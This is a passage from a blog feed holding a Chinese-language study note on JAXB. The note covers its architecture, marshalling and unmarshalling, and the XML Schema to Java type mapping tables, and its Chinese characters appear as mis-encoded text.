          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAXB å­¦ä¹ </title>
      <link href="/posts/a893dad1/"/>
      <url>/posts/a893dad1/</url>
      
        <content type="html"><![CDATA[<h1>JAXB å­¦ä¹ </h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“† 2021-06-06  21:13:30</p></blockquote><p>[TOC]</p><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><p>Java XMLç»‘å®šä½“ç³»ç»“æ„(JAXB)é€šè¿‡JAXBåº”ç”¨ç¨‹åºçš„ç¤ºä¾‹ä»‹ç»äº†Java XMLç»‘å®šä½“ç³»ç»“æ„(JAXB)æŠ€æœ¯ã€‚</p><p><strong>åœ¨é˜…è¯»æœ¬æ•™ç¨‹ä¹‹å‰</strong></p><p>è¦ç†è§£å’Œä½¿ç”¨XMLç»‘å®šJavaä½“ç³»ç»“æ„(JAXB)æ•™ç¨‹ä¸­çš„ä¿¡æ¯ï¼Œæ‚¨åº”è¯¥äº†è§£ä»¥ä¸‹æŠ€æœ¯:</p><ul><li>Javaç¼–ç¨‹è¯­è¨€åŠå…¶å¼€å‘ç¯å¢ƒ</li><li>å¯æ‰©å±•æ ‡è®°è¯­è¨€</li></ul><p>æœ¬æ•™ç¨‹åªè¯¦ç»†ç ”ç©¶JAXBç‰¹æœ‰çš„ä»£ç ã€‚</p></div><h2 id="JAXBæ¦‚è®º">JAXBæ¦‚è®º</h2><div class="story post-story"><p>ç”¨äºXMLç»‘å®šçš„Javaä½“ç³»ç»“æ„(JAXB)æä¾›äº†ä¸€ç§å¿«é€Ÿè€Œæ–¹ä¾¿çš„æ–¹æ³•æ¥ç»‘å®šXMLæ¨¡å¼å’ŒJavaè¡¨ç¤ºï¼Œä½¿å¾—Javaå¼€å‘äººå‘˜å¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨Javaåº”ç”¨ç¨‹åºä¸­åˆå¹¶XMLæ•°æ®å’Œå¤„ç†å‡½æ•°ã€‚ä½œä¸ºæ­¤è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼ŒJAXBæä¾›äº†å°†XMLå®ä¾‹æ–‡æ¡£ç¼–ç»„(è¯»å–)ä¸ºJavaå†…å®¹æ ‘ï¼Œç„¶åå°†Javaå†…å®¹æ ‘ç¼–ç»„(å†™å…¥)ä¸ºXMLå®ä¾‹æ–‡æ¡£çš„æ–¹æ³•ã€‚JAXBè¿˜æä¾›äº†ä¸€ç§ä»Javaå¯¹è±¡ç”ŸæˆXMLæ¨¡å¼çš„æ–¹æ³•ã€‚</p><p>AXB 2.0åŒ…å«äº†JAXB 1.0çš„å‡ ä¸ªé‡è¦æ”¹è¿›:</p><ul><li>æ”¯æŒæ‰€æœ‰W3C XML Schemaç‰¹æ€§ã€‚(JAXB 1.0æ²¡æœ‰ä¸ºæŸäº›W3C XML Schemaç‰¹æ€§æŒ‡å®šç»‘å®šã€‚)</li><li>é€šè¿‡æ·»åŠ <code>javax.xml.bind.annotation</code>åŒ…æ¥æ§åˆ¶è¿™ç§ç»‘å®šï¼Œæ”¯æŒå°†javaç»‘å®šåˆ°xmlã€‚(JAXB 1.0æŒ‡å®šäº†XMLæ¨¡å¼åˆ°javaçš„æ˜ å°„ï¼Œä½†æ²¡æœ‰æŒ‡å®šjavaåˆ°XMLæ¨¡å¼çš„æ˜ å°„ã€‚)</li><li>æ˜¾è‘—å‡å°‘äº†ç”Ÿæˆçš„æ¨¡å¼æ´¾ç”Ÿç±»çš„æ•°é‡ã€‚</li><li>é€šè¿‡JAXP 1.3éªŒè¯apiæä¾›çš„é¢å¤–éªŒè¯åŠŸèƒ½ã€‚</li><li>è¾ƒå°çš„è¿è¡Œæ—¶åº“ã€‚</li></ul><p>æœ¬è¯¾æè¿°JAXBä½“ç³»ç»“æ„ã€å‡½æ•°å’Œæ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶æä¾›ç¤ºä¾‹å’Œä½¿ç”¨JAXBçš„é€æ­¥è¿‡ç¨‹ã€‚</p></div><h2 id="JAXBæ¶æ„">JAXBæ¶æ„</h2><div class="story post-story"><p>æœ¬èŠ‚æè¿°JAXBå¤„ç†æ¨¡å‹ä¸­çš„ç»„ä»¶å’Œäº¤äº’ã€‚</p><h3 id="ç»“æ„æ¦‚è¿°">ç»“æ„æ¦‚è¿°</h3><p>ä¸‹å›¾æ˜¾ç¤ºäº†ç»„æˆJAXBå®ç°çš„ç»„ä»¶ã€‚</p><p>å›¾:JAXBä½“ç³»ç»“æ„æ¦‚è¿°</p><p><img src="https://docs.oracle.com/javase/tutorial/figures/jaxb/jaxb-overview.gif" class="lazyload" data-srcset="https://docs.oracle.com/javase/tutorial/figures/jaxb/jaxb-overview.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="JAXB Architectural Overview"></p><p>JAXBå®ç°ç”±ä»¥ä¸‹æ¶æ„ç»„ä»¶ç»„æˆ:</p><ul><li>æ¨¡å¼ç¼–è¯‘å™¨:å°†æºæ¨¡å¼ç»‘å®šåˆ°ä¸€ç»„ä»æ¨¡å¼æ´¾ç”Ÿçš„ç¨‹åºå…ƒç´ ã€‚ç»‘å®šç”±åŸºäºxmlçš„ç»‘å®šè¯­è¨€æè¿°ã€‚</li><li>æ¨¡å¼ç”Ÿæˆå™¨:å°†ä¸€ç»„ç°æœ‰çš„ç¨‹åºå…ƒç´ æ˜ å°„åˆ°æ´¾ç”Ÿçš„æ¨¡å¼ã€‚æ˜ å°„æ˜¯ç”±ç¨‹åºæ³¨é‡Šæè¿°çš„ã€‚</li><li>ç»‘å®šè¿è¡Œæ—¶æ¡†æ¶:æä¾›è§£ç»„(è¯»å–)å’Œç¼–ç»„(å†™å…¥)æ“ä½œï¼Œä»¥ä¾¿ä½¿ç”¨æ¨¡å¼æ´¾ç”Ÿçš„æˆ–ç°æœ‰çš„ç¨‹åºå…ƒç´ è®¿é—®ã€æ“ä½œå’ŒéªŒè¯XMLå†…å®¹ã€‚</li></ul><h3 id="JAXBç»‘å®šè¿‡ç¨‹">JAXBç»‘å®šè¿‡ç¨‹</h3><p>ä¸‹å›¾æ˜¾ç¤ºäº†JAXBç»‘å®šè¿‡ç¨‹ä¸­å‘ç”Ÿçš„äº‹æƒ…ã€‚</p><p>å›¾:JAXBç»‘å®šè¿‡ç¨‹ä¸­çš„æ­¥éª¤</p><p><img src="https://docs.oracle.com/javase/tutorial/figures/jaxb/jaxb-dataBindingProcess.gif" class="lazyload" data-srcset="https://docs.oracle.com/javase/tutorial/figures/jaxb/jaxb-dataBindingProcess.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Steps in the JAXB Binding Process"></p><p>JAXBæ•°æ®ç»‘å®šè¿‡ç¨‹ä¸­çš„ä¸€èˆ¬æ­¥éª¤æ˜¯:</p><ol><li>ç”Ÿæˆç±»(<code>Generate classes</code>):å°†XMLæ¨¡å¼ç”¨ä½œJAXBç»‘å®šç¼–è¯‘å™¨çš„è¾“å…¥ï¼Œä»¥åŸºäºè¯¥æ¨¡å¼ç”ŸæˆJAXBç±»ã€‚</li><li>ç¼–è¯‘ç±»(<code>Compile classes</code>):å¿…é¡»ç¼–è¯‘æ‰€æœ‰ç”Ÿæˆçš„ç±»ã€æºæ–‡ä»¶å’Œåº”ç”¨ç¨‹åºä»£ç ã€‚</li><li>è§£ç»„(<code>Unmarshal</code>):æ ¹æ®æºæ¨¡å¼ä¸­çš„çº¦æŸç¼–å†™çš„XMLæ–‡æ¡£ç”±JAXBç»‘å®šæ¡†æ¶è§£ç»„ã€‚è¯·æ³¨æ„ï¼ŒJAXBè¿˜æ”¯æŒä»æ–‡ä»¶å’Œæ–‡æ¡£ä»¥å¤–çš„æº(å¦‚DOMèŠ‚ç‚¹ã€å­—ç¬¦ä¸²ç¼“å†²åŒºã€SAXæºç­‰)å¯¹XMLæ•°æ®è¿›è¡Œè§£ç»„ã€‚</li><li>ç”Ÿæˆå†…å®¹æ ‘(<code>Generate content tree</code>):è§£ç»„è¿‡ç¨‹ç”Ÿæˆä»ç”Ÿæˆçš„JAXBç±»å®ä¾‹åŒ–çš„æ•°æ®å¯¹è±¡çš„å†…å®¹æ ‘;è¿™ä¸ªå†…å®¹æ ‘è¡¨ç¤ºæºXMLæ–‡æ¡£çš„ç»“æ„å’Œå†…å®¹ã€‚</li><li>éªŒè¯(å¯é€‰)ğŸ˜¦ <code>Validate (optional)</code>)è§£ç»„è¿‡ç¨‹æ¶‰åŠåœ¨ç”Ÿæˆå†…å®¹æ ‘ä¹‹å‰éªŒè¯æºXMLæ–‡æ¡£ã€‚æ³¨æ„ï¼Œå¦‚æœåœ¨æ­¥éª¤6ä¸­ä¿®æ”¹äº†å†…å®¹æ ‘ï¼Œè¿˜å¯ä»¥ä½¿ç”¨JAXB Validateæ“ä½œåœ¨å°†å†…å®¹ç¼–ç»„å›XMLæ–‡æ¡£ä¹‹å‰éªŒè¯æ›´æ”¹ã€‚</li><li>è¿‡ç¨‹å†…å®¹(<code>Process content</code>):é€šè¿‡ä½¿ç”¨ç»‘å®šç¼–è¯‘å™¨ç”Ÿæˆçš„æ¥å£ï¼Œå®¢æˆ·æœºåº”ç”¨ç¨‹åºå¯ä»¥ä¿®æ”¹Javaå†…å®¹æ ‘è¡¨ç¤ºçš„XMLæ•°æ®ã€‚</li><li>å°è£…(<code>Marshal</code>):å°†å¤„ç†è¿‡çš„å†…å®¹æ ‘å°é€åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªXMLè¾“å‡ºæ–‡æ¡£ã€‚å¯ä»¥åœ¨ç¼–ç»„å‰å¯¹å†…å®¹è¿›è¡ŒéªŒè¯ã€‚</li></ol><p><strong>More About Unmarshalling</strong></p><p>è§£ç»„(<code>Unmarshalling</code>)ä¸ºå®¢æˆ·æœºåº”ç”¨ç¨‹åºæä¾›äº†å°†<code>XMLæ•°</code>æ®è½¬æ¢ä¸º<code>jaxbæ´¾ç”Ÿçš„Javaå¯¹è±¡</code>çš„èƒ½åŠ›ã€‚å³ ä»<code>xml -&gt; java object</code></p><p><strong>More About Marshalling</strong></p><p>Marshalling ä¸ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæä¾›å°†<code>jaxbæ´¾ç”Ÿçš„Javaå¯¹è±¡</code>æ ‘è½¬æ¢ä¸º<code>XML</code>æ•°æ®çš„èƒ½åŠ›ã€‚ å³ä» <code>java object -&gt; xml</code></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>Marshalle</code>råœ¨ç”ŸæˆXMLæ•°æ®æ—¶ä½¿ç”¨<code>UTF-8</code>ç¼–ç ã€‚</p><p>å®¢æˆ·æœºåº”ç”¨ç¨‹åºä¸éœ€è¦åœ¨ç¼–ç»„ä¹‹å‰éªŒè¯Javaå†…å®¹æ ‘ã€‚ä¹Ÿä¸è¦æ±‚Javaå†…å®¹æ ‘ç›¸å¯¹äºå…¶åŸå§‹æ¨¡å¼æ˜¯æœ‰æ•ˆçš„ï¼Œä»¥ä¾¿å°†å…¶ç¼–ç»„ä¸ºXMLæ•°æ®ã€‚</p><p><strong>More About Validation</strong></p><p>Validation æ˜¯éªŒè¯XMLæ–‡æ¡£æ˜¯å¦æ»¡è¶³æ¨¡å¼ä¸­è¡¨ç¤ºçš„æ‰€æœ‰çº¦æŸçš„è¿‡ç¨‹</p><p>JAXB 1.0åœ¨ç¼–ç»„æ—¶æä¾›éªŒè¯ï¼Œå¹¶åœ¨JAXBå†…å®¹æ ‘ä¸Šæ”¯æŒæŒ‰éœ€éªŒè¯ã€‚JAXB 2.0åªå…è®¸åœ¨è§£ç»„å’Œç¼–ç»„æ—¶è¿›è¡ŒéªŒè¯ã€‚webæœåŠ¡å¤„ç†æ¨¡å‹åœ¨è¯»å–æ•°æ®æ—¶æ˜¯å®½æ¾çš„ï¼Œè€Œåœ¨å†™å‡ºæ•°æ®æ—¶æ˜¯ä¸¥æ ¼çš„ã€‚ä¸ºäº†æ»¡è¶³è¯¥æ¨¡å‹ï¼Œåœ¨å°é€æ—¶é—´ä¸­æ·»åŠ äº†éªŒè¯ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥ç¡®è®¤åœ¨ä¿®æ”¹JAXBè¡¨å•ä¸­çš„æ–‡æ¡£æ—¶æ²¡æœ‰ä½¿XMLæ–‡æ¡£å¤±æ•ˆã€‚</p></div><h2 id="è¡¨ç¤º-XML-å†…å®¹">è¡¨ç¤º XML å†…å®¹</h2><div class="story post-story"><p>æœ¬èŠ‚æè¿° JAXB å¦‚ä½•å°† XML å†…å®¹è¡¨ç¤ºä¸º Java å¯¹è±¡ã€‚</p><p><strong>XML æ¨¡å¼çš„ Java è¡¨ç¤º</strong></p><p>JAXB æ”¯æŒåœ¨ Java åŒ…ä¸­å¯¹ç”Ÿæˆçš„ç±»è¿›è¡Œåˆ†ç»„ã€‚ä¸€ä¸ªåŒ…åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ä» XML å…ƒç´ åç§°æ´¾ç”Ÿæˆ–ç”±ç»‘å®šå®šåˆ¶æŒ‡å®šçš„ Java ç±»åç§°ã€‚</li><li>ä¸€ä¸ª<code>ObjectFactoryçš„</code>ç±»ï¼Œå®ƒæ˜¯ç”¨æ¥è¿”å›ä¸€ä¸ªå¿…ç„¶çš„Javaç±»çš„å®ä¾‹çš„å·¥å‚ã€‚</li></ul><h3 id="ç»‘å®š-XML-æ¨¡å¼">ç»‘å®š XML æ¨¡å¼</h3><p>æœ¬èŠ‚ä»‹ç» JAXB ä½¿ç”¨çš„é»˜è®¤ XML-to-Java ç»‘å®šã€‚æ‰€æœ‰è¿™äº›ç»‘å®šéƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨è‡ªå®šä¹‰ç»‘å®šå£°æ˜æ¥å…¨å±€æˆ–é€ä¸ªè¦†ç›–ã€‚æœ‰å…³é»˜è®¤ JAXB ç»‘å®šçš„å®Œæ•´ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="http://jaxb.java.net/">JAXB è§„èŒƒ</a>ã€‚</p><p><strong>ç®€å•ç±»å‹å®šä¹‰</strong></p><p>ä½¿ç”¨ç®€å•ç±»å‹å®šä¹‰çš„æ¨¡å¼ç»„ä»¶é€šå¸¸ç»‘å®šåˆ° Java å±æ€§ã€‚å› ä¸ºæœ‰ä¸åŒç§ç±»çš„æ¶æ„ç»„ä»¶ï¼Œä»¥ä¸‹ Java å±æ€§å±æ€§ï¼ˆæ¶æ„ç»„ä»¶é€šç”¨ï¼‰åŒ…æ‹¬ï¼š</p><ul><li>åŸºç¡€ç±»å‹</li><li>é›†åˆç±»å‹ï¼Œå¦‚æœæœ‰</li><li>è°“è¯</li></ul><p>å…¶ä½™çš„ Java å±æ€§å±æ€§æ˜¯ä½¿ç”¨<code>ç®€å•</code>ç±»å‹å®šä¹‰åœ¨æ¨¡å¼ç»„ä»¶ä¸­æŒ‡å®šçš„ã€‚</p><p><strong>é»˜è®¤æ•°æ®ç±»å‹ç»‘å®š</strong></p><p>ä»¥ä¸‹éƒ¨åˆ†è§£é‡Šäº†é»˜è®¤çš„ schema-to-Javaã€ <code>JAXBElement</code>å’Œ Java-to-schema æ•°æ®ç±»å‹ç»‘å®šã€‚</p><h4 id="Schema-to-Java-Mapping">Schema-to-Java Mapping</h4><p>Javaè¯­è¨€æä¾›äº†æ¯”XMLæ¨¡å¼æ›´ä¸°å¯Œçš„æ•°æ®ç±»å‹é›†,ä¸‹è¡¨æä¾›äº†JAXBä¸­XMLæ•°æ®ç±»å‹åˆ°Javaæ•°æ®ç±»å‹çš„æ˜ å°„ã€‚</p><table><thead><tr><th>XML Schema Type</th><th>Java Data Type</th></tr></thead><tbody><tr><td><code>xsd:string</code></td><td><code>java.lang.String</code></td></tr><tr><td><code>xsd:integer</code></td><td><code>java.math.BigInteger</code></td></tr><tr><td><code>xsd:int</code></td><td><code>int</code></td></tr><tr><td><code>xsd.long</code></td><td><code>long</code></td></tr><tr><td><code>xsd:short</code></td><td><code>short</code></td></tr><tr><td><code>xsd:decimal</code></td><td><code>java.math.BigDecimal</code></td></tr><tr><td><code>xsd:float</code></td><td><code>float</code></td></tr><tr><td><code>xsd:double</code></td><td><code>double</code></td></tr><tr><td><code>xsd:boolean</code></td><td><code>boolean</code></td></tr><tr><td><code>xsd:byte</code></td><td><code>byte</code></td></tr><tr><td><code>xsd:QName</code></td><td><code>javax.xml.namespace.QName</code></td></tr><tr><td><code>xsd:dateTime</code></td><td><code>javax.xml.datatype.XMLGregorianCalendar</code></td></tr><tr><td><code>xsd:base64Binary</code></td><td><code>byte[]</code></td></tr><tr><td><code>xsd:hexBinary</code></td><td><code>byte[]</code></td></tr><tr><td><code>xsd:unsignedInt</code></td><td><code>long</code></td></tr><tr><td><code>xsd:unsignedShort</code></td><td><code>int</code></td></tr><tr><td><code>xsd:unsignedByte</code></td><td><code>short</code></td></tr><tr><td><code>xsd:time</code></td><td><code>javax.xml.datatype.XMLGregorianCalendar</code></td></tr><tr><td><code>xsd:date</code></td><td><code>javax.xml.datatype.XMLGregorianCalendar</code></td></tr><tr><td><code>xsd:g</code></td><td><code>javax.xml.datatype.XMLGregorianCalendar</code></td></tr><tr><td><code>xsd:anySimpleType</code></td><td><code>java.lang.Object</code></td></tr><tr><td><code>xsd:anySimpleType</code></td><td><code>java.lang.String</code></td></tr><tr><td><code>xsd:duration</code></td><td><code>javax.xml.datatype.Duration</code></td></tr><tr><td><code>xsd:NOTATION</code></td><td><code>javax.xml.namespace.QName</code></td></tr></tbody></table><p>è¡¨:XMLæ¨¡å¼å†…ç½®æ•°æ®ç±»å‹çš„JAXBæ˜ å°„</p><p><strong>JAXBElementå¯¹è±¡</strong></p><p>å½“XMLå†…å®¹çš„æ´¾ç”ŸJavaè¡¨ç¤ºä¸èƒ½æ¨æ–­XMLå…ƒç´ ä¿¡æ¯æ—¶ï¼Œå°†æä¾›ä¸€ä¸ªJAXBElementå¯¹è±¡ã€‚è¯¥å¯¹è±¡å…·æœ‰è·å–å’Œè®¾ç½®å¯¹è±¡åç§°å’Œå¯¹è±¡å€¼çš„æ–¹æ³•ã€‚</p><h4 id="Java-to-Schema-Mapping">Java-to-Schema Mapping</h4><p>ä¸‹è¡¨æ˜¾ç¤ºäº†Javaç±»åˆ°XMLæ•°æ®ç±»å‹çš„é»˜è®¤æ˜ å°„ã€‚</p><table><thead><tr><th>Java Class</th><th>XML Data Type</th></tr></thead><tbody><tr><td><code>java.lang.String</code></td><td><code>xs:string</code></td></tr><tr><td><code>java.math.BigInteger</code></td><td><code>xs:integer</code></td></tr><tr><td><code>java.math.BigDecimal</code></td><td><code>xs:decimal</code></td></tr><tr><td><code>java.util.Calendar</code></td><td><code>xs:dateTime</code></td></tr><tr><td><code>java.util.Date</code></td><td><code>xs:dateTime</code></td></tr><tr><td><code>javax.xml.namespace.QName</code></td><td><code>xs:QName</code></td></tr><tr><td><code>java.net.URI</code></td><td><code>xs:string</code></td></tr><tr><td><code>javax.xml.datatype.XMLGregorianCalendar</code></td><td><code>xs:anySimpleType</code></td></tr><tr><td><code>javax.xml.datatype.Duration</code></td><td><code>xs:duration</code></td></tr><tr><td><code>java.lang.Object</code></td><td><code>xs:anyType</code></td></tr><tr><td><code>java.awt.Image</code></td><td><code>xs:base64Binary</code></td></tr><tr><td><code>javax.activation.DataHandler</code></td><td><code>xs:base64Binary</code></td></tr><tr><td><code>javax.xml.transform.Source</code></td><td><code>xs:base64Binary</code></td></tr><tr><td><code>java.util.UUID</code></td><td><code>xs:string</code></td></tr></tbody></table><p>è¡¨:XMLæ•°æ®ç±»å‹åˆ°Javaç±»çš„JAXBæ˜ å°„</p></div><h2 id="è‡ªå®šä¹‰ç”Ÿæˆçš„ç±»å’Œ-Java-ç¨‹åºå…ƒç´ ">è‡ªå®šä¹‰ç”Ÿæˆçš„ç±»å’Œ Java ç¨‹åºå…ƒç´ </h2><div class="story post-story"><p>ä»¥ä¸‹éƒ¨åˆ†æè¿°äº†å¦‚ä½•å®šåˆ¶ç”Ÿæˆçš„ JAXB ç±»å’Œ Java ç¨‹åºå…ƒç´ ã€‚</p><h3 id="Schema-to-Java">Schema-to-Java</h3><p>è‡ªå®šä¹‰JAXBç»‘å®šå£°æ˜ä½¿æ‚¨èƒ½å¤Ÿåœ¨XMLæ¨¡å¼ä¸­ç‰¹å®šäºXMLçš„çº¦æŸä¹‹å¤–è‡ªå®šä¹‰ç”Ÿæˆçš„JAXBç±»ï¼Œä»¥åŒ…æ‹¬ç‰¹å®šäºjavaçš„ç»†åŒ–ï¼Œä¾‹å¦‚ç±»å’ŒåŒ…åæ˜ å°„ã€‚</p><p>JAXB æä¾›äº†ä¸¤ç§è‡ªå®šä¹‰ XML æ¨¡å¼çš„æ–¹æ³•ï¼š</p><ul><li>ä½œä¸ºæº XML æ¨¡å¼ä¸­çš„å†…è”æ³¨é‡Š</li><li>ä½œä¸ºä¼ é€’ç»™ JAXB ç»‘å®šç¼–è¯‘å™¨çš„å¤–éƒ¨ç»‘å®šå®šåˆ¶æ–‡ä»¶ä¸­çš„å£°æ˜</li></ul><p>æœ¬æ–‡æ¡£åé¢æä¾›äº†å±•ç¤ºå¦‚ä½•å®šåˆ¶ JAXB ç»‘å®šçš„ä»£ç ç¤ºä¾‹ã€‚</p><h3 id="Java-to-Schema">Java-to-Schema</h3><p><code>javax.xml.bind.annotation</code> åŒ…ä¸­å®šä¹‰çš„ JAXB æ³¨é‡Šå¯ç”¨äºè‡ªå®šä¹‰ Java ç¨‹åºå…ƒç´ åˆ° XML æ¨¡å¼çš„æ˜ å°„ã€‚ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Java åŒ…çš„ JAXB æ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸ Java åŒ…å…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606214309.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606214309.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606214307713"></p><p>ä¸‹è¡¨æ€»ç»“äº†å¯ä»¥ä¸Javaç±»ä¸€èµ·ä½¿ç”¨çš„JAXBæ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸ Java ç±»å…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606214733.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606214733.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606214731973"></p><p>ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Java<code>æšä¸¾</code>ç±»å‹çš„JAXB æ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸ Java<code>æšä¸¾</code> ç±»å‹å…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606214746.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606214746.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606214745020"></p><p>ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Java å±æ€§å’Œå­—æ®µçš„ JAXB æ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸ Java å±æ€§å’Œå­—æ®µå…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606214930.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606214930.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606214802387"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606214948.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606214948.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606214947200"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606215004.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606215004.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606215002879"></p><p>ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äºå¯¹è±¡å·¥å‚çš„ JAXB æ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸å¯¹è±¡å·¥å‚å…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606215130.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606215130.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606215128719"></p><p>ä¸‹è¡¨æ€»ç»“äº†å¯ä¸é€‚é…å™¨ä¸€èµ·ä½¿ç”¨çš„ JAXB æ³¨é‡Šã€‚</p><p>è¡¨ï¼šä¸é€‚é…å™¨å…³è”çš„ JAXB æ³¨é‡Š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606215145.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606215145.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606215144297"></p></div><h2 id="JAXB-Examples">JAXB Examples</h2><div class="story post-story"><p>ä»¥ä¸‹éƒ¨åˆ†æè¿°äº†å¦‚ä½•ä½¿ç”¨ JAXB RI åŒ…ä¸­åŒ…å«çš„ç¤ºä¾‹åº”ç”¨ç¨‹åºã€‚JAXB RI åŒ…å¯ä» <a href="http://jaxb.java.net/">http://jaxb.java.net è·å¾—</a>ã€‚ä¸‹è½½å¹¶å®‰è£… JAXB RI åŒ…ã€‚è¿™äº›ç¤ºä¾‹ä½äº<em>jaxb-ri-install</em> <code>/samples/</code>ç›®å½•ä¸­ã€‚è¿™äº›ç¤ºä¾‹æ¼”ç¤ºå¹¶å»ºç«‹åœ¨å…³é”®çš„ JAXB ç‰¹æ€§å’Œæ¦‚å¿µä¹‹ä¸Šã€‚æŒ‰ç…§æ˜¾ç¤ºçš„é¡ºåºæ‰§è¡Œè¿™äº›ç¨‹åºã€‚</p><p>é˜…è¯»å®Œæœ¬èŠ‚åï¼Œæ‚¨åº”è¯¥å¯¹ JAXB æ„Ÿåˆ°å¾ˆèˆ’æœï¼Œæ‚¨å¯ä»¥ï¼š</p><ul><li><p>ä» XML æ¨¡å¼ç”Ÿæˆ JAXB Java ç±»</p></li><li><p>ä½¿ç”¨æ¨¡å¼æ´¾ç”Ÿçš„ JAXB ç±»æ¥è§£ç»„å’Œç¼–ç»„ Java åº”ç”¨ç¨‹åºä¸­çš„ XML å†…å®¹</p></li><li><p>ä½¿ç”¨æ´¾ç”Ÿæ¶æ„çš„ JAXB ç±»åˆ›å»º Java å†…å®¹æ ‘</p></li><li><p>åœ¨è§£ç»„å’Œè¿è¡Œæ—¶éªŒè¯ XML å†…å®¹</p></li><li><p>è‡ªå®šä¹‰ JAXB æ¨¡å¼åˆ° Java çš„ç»‘å®š</p></li></ul><p>æœ¬æ–‡æ¡£æè¿°äº†ä¸‰ç»„ç¤ºä¾‹ï¼š</p><ul><li>åŸºæœ¬ç¤ºä¾‹ï¼ˆModify Marshalã€Unmarshal Validateï¼‰æ¼”ç¤ºäº†åŸºæœ¬çš„ JAXB æ¦‚å¿µï¼Œä¾‹å¦‚ä½¿ç”¨é»˜è®¤è®¾ç½®å’Œç»‘å®šè§£ç»„ã€ç¼–ç»„å’ŒéªŒè¯ XML å†…å®¹ã€‚</li><li>è‡ªå®šä¹‰ç¤ºä¾‹ï¼ˆè‡ªå®šä¹‰å†…è”ã€æ•°æ®ç±»å‹è½¬æ¢å™¨ã€å¤–éƒ¨è‡ªå®šä¹‰ï¼‰æ¼”ç¤ºäº†è‡ªå®šä¹‰ XML æ¨¡å¼åˆ° Java å¯¹è±¡çš„é»˜è®¤ç»‘å®šçš„å„ç§æ–¹æ³•ã€‚</li><li>java-to-schema ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ³¨é‡Šå°† Java ç±»æ˜ å°„åˆ° XML æ¨¡å¼ã€‚</li></ul><hr><p><strong>æ³¨æ„ï¼š</strong> åŸºæœ¬å’Œè‡ªå®šä¹‰ç¤ºä¾‹åŸºäºé‡‡è´­è®¢å•åœºæ™¯ã€‚æ¯ä¸ªéƒ½ä½¿ç”¨ä¸€ä¸ª XML æ–‡æ¡£<code>po.xml</code>ï¼Œå®ƒæ˜¯é’ˆå¯¹ XML æ¨¡å¼<code>po.xsd ç¼–å†™çš„</code>ã€‚è¿™äº›æ–‡æ¡£æ¥è‡ª <a href="http://www.w3.org/TR/xmlschema-0/">W3C XML Schema Part 0: Primer</a>ï¼Œç”± David C. Fallside 